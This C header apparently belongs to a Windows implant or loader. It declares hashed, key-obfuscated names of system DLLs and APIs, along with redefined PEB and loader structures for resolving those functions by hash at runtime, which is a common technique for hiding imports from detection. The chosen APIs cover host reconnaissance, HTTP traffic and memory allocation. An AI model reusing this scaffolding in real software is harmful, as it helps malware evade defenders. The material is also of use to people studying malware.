#ifndef _APIRESOLVE_H
#define _APIRESOLVE_H

#include <stdint.h>
#include "windows.h"

#include "wininet.h"

#ifdef _DEBUG
#include <stdio.h>
#endif

#define CRYPT_KEY 0x41424344
#define FAIL 0 
#define SUCCESS 1

uint64_t getFunctionPtr(unsigned long, unsigned long);

// ----  KERNEL32 ----
#define CRYPTED_HASH_KERNEL32 0x3102ad31 
#define CRYPTED_HASH_LOADLIBRARYA 0x1efdb3bf
#define CRYPTED_HASH_VIRTUALALLOC 0x796e4cd3
#define CRYPTED_HASH_GETCOMPUTERNAMEA 0xeb21fcf2
#define CRYPTED_HASH_GETCOMPUTERNAMEEXA 0x9310e6b7
#define CRYPTED_HASH_LSTRCATA 0x93fde827
#define CRYPTED_HASH_LSTRCATW 0x93fde83d
#define CRYPTED_HASH_FINDCLOSE 0xf5a50658
#define CRYPTED_HASH_LSTRLENA 0x9386e84e
#define CRYPTED_HASH_CLOSEHANDLE 0x79328943
#define CRYPTED_HASH_VIRTUALFREE 0x27cd8c6a
#define CRYPTED_HASH_GETTICKCOUNT 0xef55fd
#define CRYPTED_HASH_SLEEP 0x4f5ba6ba
#define CRYPTED_HASH_COPYMEMORY 0x14d8cfcf
#define CRYPTED_HASH_GETCURRENTTHREAD 0xa17b4b84
#define CRYPTED_HASH_TERMINATETHREAD 0xc6ec2902
#define CRYPTED_HASH_MULTIBYTETOWIDECHAR 0xa3bf99ca
#define CRYPTED_HASH_GETCURRENTPROCESSID 0xe2fd27f0
#define CRYPTED_HASH_GETPROCESSIMAGEFILENAMEA 0x5f11c72d
#define CRYPTED_HASH_GETCURRENTPROCESS 0x8bcf3663

typedef int(WINAPI* MULTIBYTETOWIDECHAR)(UINT, DWORD, LPCCH, int, LPWSTR, int);
typedef BOOL(WINAPI* CLOSEHANDLE)(HANDLE);
typedef BOOL(WINAPI* GETCOMPUTERNAME)(LPSTR, LPDWORD);
typedef BOOL(WINAPI* GETCOMPUTERNAMEEXA)(COMPUTER_NAME_FORMAT, LPSTR, LPDWORD);
typedef HMODULE(WINAPI* LOADLIBRARYA)(LPCSTR);
typedef LPSTR(WINAPI* LSTRCATA)(LPSTR, LPSTR);
typedef LPSTR(WINAPI* LSTRCATW)(LPWSTR, LPWSTR);
typedef LPVOID(WINAPI* VIRTUALALLOC)(LPVOID, SIZE_T, DWORD, DWORD);
typedef int(WINAPI* LSTRLENA)(LPCSTR);
typedef BOOL(WINAPI* VIRTUALFREE)(LPVOID, SIZE_T, DWORD);
typedef DWORD(WINAPI* GETTICKCOUNT)();
typedef void(WINAPI* SLEEP)();
typedef BOOL(WINAPI* VIRTUALFREE)(LPVOID, SIZE_T, DWORD);
typedef void(WINAPI* COPYMEMORY)(PVOID, void*, SIZE_T);
typedef HANDLE (WINAPI* GETCURRENTTHREAD)();
typedef DWORD(WINAPI* GETCURRENTROCESSID)(void);
typedef DWORD(WINAPI* GETPROCESSIMAGEFILENAMEA)(HANDLE, LPSTR, DWORD);
typedef HANDLE(WINAPI* GETCURRENTPROCESS)(void);

// ---- USER32 ----
#define CRYPTED_HASH_USER32 0x985bec97
#define CRYPTED_HASH_WSPRINTFA 0xb9dafb87

typedef int(WINAPI* WSPRINTFA)(LPSTR, LPCSTR, ...);

// ---- Advapi32 ----
#define CRYPTED_HASH_ADVAPI32 0x2662c90d
#define CRYPTED_HASH_GETUSERNAMEA 0xda81e802

typedef BOOL(WINAPI* GETUSERNAMEA)(LPSTR, LPDWORD);

// ---- Wininet.dll ----
#define CRYPTED_HASH_WININET 0xccffdf29
#define CRYPTED_HASH_INTERNETCRACKURLA 0xd0ce5a22
#define CRYPTED_HASH_INTERNETOPENA 0xb5ef33e5
#define CRYPTED_HASH_INTERNETOPENURLA 0xce1ee0f0
#define CRYPTED_HASH_INTERNETREADFILE 0xba0dcdee
#define CRYPTED_HASH_INTERNETCLOSEHANDLE 0x303fdb4
#define CRYPTED_HASH_INTERNETCONNECTA 0x511221d
#define CRYPTED_HASH_HTTPOPENREQUESTA 0xb1befaa5
#define CRYPTED_HASH_HTTPADDREQUESTHEADERSA 0x8659fc70
#define CRYPTED_HASH_HTTPSENDREQUESTA 0xd01356fd
#define CRYPTED_HASH_INTERNETQUERYOPTIONA 0xbfcc45da
#define CRYPTED_HASH_INTERNETSETOPTIONA 0xedd0cdb0

typedef BOOL(WINAPI* INTERNETCRACKURLA)(LPCSTR, DWORD, DWORD, LPURL_COMPONENTSA);
typedef HINTERNET(WINAPI* INTERNETOPENA)(LPCSTR, DWORD, LPCSTR, LPCSTR, DWORD);
typedef HINTERNET(WINAPI* INTERNETOPENURLA)(HINTERNET, LPCSTR, LPCSTR, DWORD, DWORD, DWORD_PTR);
typedef BOOL(WINAPI* INTERNETREADFILE)(HINTERNET, LPVOID, DWORD, LPDWORD);
typedef BOOL(WINAPI* INTERNETCLOSEHANDLE)(HINTERNET);
typedef HINTERNET(WINAPI* INTERNETCONNECTA)(HINTERNET, LPCSTR, INTERNET_PORT, LPCSTR, LPCSTR, DWORD, DWORD, DWORD_PTR);
typedef HINTERNET(WINAPI* HTTPOPENREQUESTA)(HINTERNET, LPCTSTR, LPCTSTR, LPCTSTR, LPCTSTR, LPCTSTR*, DWORD, DWORD_PTR);
typedef BOOL(WINAPI* HTTPADDREQUESTHEADERSA)(HINTERNET, LPCSTR, DWORD, DWORD);
typedef BOOL(WINAPI* HTTPSENDREQUESTA)(HINTERNET, LPCSTR, DWORD, LPVOID, DWORD);
typedef BOOL(WINAPI* INTERNETQUERYOPTIONA)(HINTERNET, DWORD, LPVOID, LPDWORD);
typedef BOOL(WINAPI* INTERNETSETOPTIONA)(HINTERNET, DWORD, LPVOID, DWORD);

// ---- Crypt32.dll ----
#define CRYPTED_HASH_CRYPT32 0x53d725c2
#define CRYPTED_HASH_CRYPTBINARYTOSTRINGA 0x72e4a033
#define CRYPTED_HASH_CRYPTSTRINGTOBINARYA 0x86387633

typedef BOOL(WINAPI* CRYPTBINARYTOSTRINGA)(const BYTE*, DWORD, DWORD, LPSTR, DWORD *);
typedef BOOL(WINAPI* CRYPTSTRINGTOBINARYA)(LPCSTR, DWORD, DWORD, BYTE*, DWORD*, DWORD*, DWORD*);

// ---- shlwapi.dll ----
#define CRYPTED_HASH_SHLWAPI 0xe64fd763
#define CRYPTED_HASH_STRSTRA 0x4ef4617c

typedef PCSTR(WINAPI* STRSTRA)(PCSTR, PCSTR);

// ---- psapi.dll ----
#define CRYPTED_HASH_PSAPI 0xf82688

typedef struct _UNICODE_STR {
    USHORT Length;
    USHORT MaximumLength;
    PWSTR pBuffer;
} UNICODE_STR, * PUNICODE_STR;

typedef struct _PEB_LDR_DATA
{
    DWORD dwLength;
    DWORD dwInitialized;
    LPVOID lpSsHandle;
    LIST_ENTRY InLoadOrderModuleList;
    LIST_ENTRY InMemoryOrderModuleList;
    LIST_ENTRY InInitializationOrderModuleList;
    LPVOID lpEntryInProgress;
} PEB_LDR_DATA, * PPEB_LDR_DATA;

typedef struct _LDR_DATA_TABLE_ENTRY
{
    LIST_ENTRY InMemoryOrderModuleList;
    LIST_ENTRY InInitializationOrderModuleList;
    PVOID DllBase;
    PVOID EntryPoint;
    ULONG SizeOfImage;
    UNICODE_STR FullDllName;
    UNICODE_STR BaseDllName;
    ULONG Flags;
    SHORT LoadCount;
    SHORT TlsIndex;
    LIST_ENTRY HashTableEntry;
    ULONG TimeDateStamp;
} LDR_DATA_TABLE_ENTRY, * PLDR_DATA_TABLE_ENTRY;

//redefine PEB_FREE_BLOCK struct
typedef struct _PEB_FREE_BLOCK
{
    struct _PEB_FREE_BLOCK* pNext;
    DWORD dwSize;
} PEB_FREE_BLOCK, * PPEB_FREE_BLOCK;

//redefine PEB struct
typedef struct __PEB
{
    BYTE bInheritedAddressSpace;
    BYTE bReadImageFileExecOptions;
    BYTE bBeingDebugged;
    BYTE bSpareBool;
    LPVOID lpMutant;
    LPVOID lpImageBaseAddress;
    PPEB_LDR_DATA pLdr;
    LPVOID lpProcessParameters;
    LPVOID lpSubSystemData;
    LPVOID lpProcessHeap;
    PRTL_CRITICAL_SECTION pFastPebLock;
    LPVOID lpFastPebLockRoutine;
    LPVOID lpFastPebUnlockRoutine;
    DWORD dwEnvironmentUpdateCount;
    LPVOID lpKernelCallbackTable;
    DWORD dwSystemReserved;
    DWORD dwAtlThunkSListPtr32;
    PPEB_FREE_BLOCK pFreeList;
    DWORD dwTlsExpansionCounter;
    LPVOID lpTlsBitmap;
    DWORD dwTlsBitmapBits[2];
    LPVOID lpReadOnlySharedMemoryBase;
    LPVOID lpReadOnlySharedMemoryHeap;
    LPVOID lpReadOnlyStaticServerData;
    LPVOID lpAnsiCodePageData;
    LPVOID lpOemCodePageData;
    LPVOID lpUnicodeCaseTableData;
    DWORD dwNumberOfProcessors;
    DWORD dwNtGlobalFlag;
    LARGE_INTEGER liCriticalSectionTimeout;
    DWORD dwHeapSegmentReserve;
    DWORD dwHeapSegmentCommit;
    DWORD dwHeapDeCommitTotalFreeThreshold;
    DWORD dwHeapDeCommitFreeBlockThreshold;
    DWORD dwNumberOfHeaps;
    DWORD dwMaximumNumberOfHeaps;
    LPVOID lpProcessHeaps;
    LPVOID lpGdiSharedHandleTable;
    LPVOID lpProcessStarterHelper;
    DWORD dwGdiDCAttributeList;
    LPVOID lpLoaderLock;
    DWORD dwOSMajorVersion;
    DWORD dwOSMinorVersion;
    WORD wOSBuildNumber;
    WORD wOSCSDVersion;
    DWORD dwOSPlatformId;
    DWORD dwImageSubsystem;
    DWORD dwImageSubsystemMajorVersion;
    DWORD dwImageSubsystemMinorVersion;
    DWORD dwImageProcessAffinityMask;
    DWORD dwGdiHandleBuffer[34];
    LPVOID lpPostProcessInitRoutine;
    LPVOID lpTlsExpansionBitmap;
    DWORD dwTlsExpansionBitmapBits[32];
    DWORD dwSessionId;
    ULARGE_INTEGER liAppCompatFlags;
    ULARGE_INTEGER liAppCompatFlagsUser;
    LPVOID lppShimData;
    LPVOID lpAppCompatInfo;
    UNICODE_STR usCSDVersion;
    LPVOID lpActivationContextData;
    LPVOID lpProcessAssemblyStorageMap;
    LPVOID lpSystemDefaultActivationContextData;
    LPVOID lpSystemAssemblyStorageMap;
    DWORD dwMinimumStackCommit;
} _PEB, * _PPEB;

#endif
